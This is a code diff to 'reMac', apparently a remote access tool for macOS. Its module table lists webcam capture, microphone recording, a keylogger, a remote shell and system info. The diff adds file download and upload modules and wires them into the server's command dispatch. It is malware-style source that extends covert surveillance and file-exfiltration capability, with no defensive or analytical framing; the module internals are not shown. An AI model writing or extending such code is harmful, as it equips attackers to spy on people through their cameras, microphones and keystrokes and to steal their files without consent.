@@ -11,6 +11,8 @@ from apps.server.modules import mod_webcam
 from apps.server.modules import mod_recmic
 from apps.server.modules import mod_modHelp
 from apps.server.modules import mod_info
+from apps.server.modules import mod_download
+from apps.server.modules import mod_upload
 
 from apps.libs.reMac_libbase import reMac_libbase
 
@@ -26,7 +28,9 @@ reMacModules = {
     'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module (NOT WORKING YET)', 'kl'],
     'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm [-t <seconds to record>]'],
     'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>'],
-    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in']
+    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in'],
+    'dl': [mod_download.mod_download(), 'download', 'Call download module (to app "/tmp")', 'dl <remote filename>'],
+    'ul': [mod_upload.mod_upload(), 'upload', 'Call upload module (to app "/tmp")', 'ul <local filename>']
 }
 
 
@@ -84,6 +88,9 @@ class reMac_libserver(reMac_libbase):
                 or input == "in" \
                 or input == "d":  # or input == "help":
             return reMacModules[input][0].run_mod()
+        elif input == "dl" \
+                or input == "ul":
+            return reMacModules[input][0].run_mod(input, value)
         elif input == "sh":
             return reMacModules["sh"][0].run_cmd(input, value)
         elif input.startswith("mh"):
@@ -104,7 +111,15 @@ class reMac_libserver(reMac_libbase):
                 or action == "wc" \
                 or action == "rm" \
                 or action == "in" \
+                or action == "dl" \
                 or action.startswith("mh"):
+            answer = self.processInput(action, value)
+            if action == "dl":
+                filename = value.split("/")
+                content = {"action": action, "result": answer, "filename": filename[len(filename)-1]}
+            else:
+                content = {"action": action, "result": answer}
+        elif action == "ul":
             answer = self.processInput(action, value)
             content = {"action": action, "result": answer}
         else:
